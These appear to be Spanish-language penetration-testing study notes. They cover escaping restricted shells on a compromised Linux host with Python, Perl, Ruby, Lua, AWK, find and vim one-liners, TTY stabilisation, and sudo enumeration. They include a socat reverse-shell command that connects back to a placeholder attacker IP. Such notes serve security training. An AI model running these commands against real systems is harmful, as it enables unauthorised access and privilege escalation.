---
tags:
  - linux
  - nixshells
---
## Conceptos Clave (TL;DR)

* Tras obtener un acceso inicial, es común aterrizar en una shell limitada ("jail shell") que restringe la ejecución de comandos.
* Cuando lenguajes comunes como Python no están instalados, es crítico conocer métodos alternativos para invocar un intérprete de comandos completo.
* El objetivo principal es invocar un intérprete nativo del sistema en modo interactivo, siendo `/bin/sh` (bourne shell) y `/bin/bash` (bourne again shell) los más comunes en entornos Linux.


## Herramientas Clave

* **Intérpretes de Comandos**: `/bin/sh` interactivo directo.

* **Lenguajes de Programación**: Perl, Ruby y Lua, los cuales pueden ejecutar llamadas al sistema para generar la shell.

* **Binarios del Sistema (GTFOBins)**: AWK, Find y VIM poseen funcionalidades integradas para ejecutar subcomandos y evadir shells restringidas.

  
## Metodología Paso a Paso

1. **Identificar Recursos Disponibles**: Determinar qué binarios o lenguajes de programación existen en el sistema comprometido para seleccionar el vector de escape.
2. **Spawning de la Shell**: Ejecutar el payload correspondiente (one-liner o script) para forzar la ejecución de `/bin/sh` u otro intérprete interactivo.
3. **Enumeración de Permisos**: Una vez obtenida la shell interactiva, listar permisos de archivos y configuraciones de `sudo` para trazar vectores de escalada de privilegios.


## Cheat Sheet de Comandos

### Wrapper TTY

- `Ctrl + Z` (Poner en segundo plano)
- `stty raw -echo; fg` (En tu máquina)
- `export TERM=xterm` (De vuelta en la víctima)

**Python 3
```Bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Python 2
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Python 2
```bash
python2 -c 'import pty; pty.spawn("/bin/bash")'
```

**Script
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

**Perl:**
```bash
perl -e 'exec "/bin/sh";'
```

```bash
perl: exec "/bin/sh";
```

**Ruby
```bash
ruby -e 'exec "/bin/sh"'
```

**Lua
```bash
lua -e "os.execute('/bin/sh')"
```

### Socat 
**Atacante
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**Víctima
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:TU_IP_ATACANTE:4444
```

---

```bash
# Ejecuta el intérprete bourne shell en modo interactivo (-i)

/bin/sh -i
```

```bash
# Utiliza Perl para ejecutar directamente una bourne shell desde la línea de comandos

perl -e 'exec "/bin/sh";'
```

```bash
# Script de Perl para invocar la shell (debe ejecutarse desde un archivo de script)

perl: exec "/bin/sh";
```
  
```bash
# Script de Ruby para invocar la shell (debe ejecutarse desde un archivo de script)

ruby: exec "/bin/sh"
```
  
```bash
# Script de Lua utilizando el método os.execute para invocar la shell (debe ejecutarse desde un script)

lua: os.execute('/bin/sh')
```

```bash
# Utiliza AWK para ejecutar una llamada al sistema que invoca la shell

awk 'BEGIN {system("/bin/sh")}'
```

```bash
# Utiliza Find para buscar un archivo específico y, a través de -exec, ejecuta el payload de AWK

find / -name <FILE_NAME> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

```bash
# Utiliza Find ejecutado en el directorio actual para iniciar el intérprete de shell directamente

find . -exec /bin/sh \; -quit
```

```bash
# Ejecuta VIM pasando un comando (-c) que invoca la shell

vim -c ':!/bin/sh'
```

```bash
# Secuencia de escape interactiva desde dentro de VIM

vim
:set shell=/bin/sh
:shell
```

```bash
# Lista propiedades y permisos de un archivo o binario específico para evaluar acceso

ls -la <PATH_TO_FILE_OR_BINARY>
```

```bash
# Muestra los comandos que el usuario actual tiene permitido ejecutar mediante sudo

sudo -l
```


## "Gotchas" y Troubleshooting

* **Ejecución desde Scripts**: Las sintaxis mostradas para Ruby, Lua y la segunda opción de Perl están diseñadas estrictamente para ser ejecutadas desde un script, no como comandos directos de una sola línea en la terminal.

* **Dependencia de Find**: Si se utiliza el comando `find` con la bandera `-exec`, es un requisito indispensable que el comando logre encontrar el archivo especificado; si el archivo no existe, la shell no se generará.

* **Estabilidad para Sudo**: El comando `sudo -l` requiere imperativamente una shell interactiva y estable. Si se ejecuta desde una shell inestable, es probable que el comando no devuelva ningún output.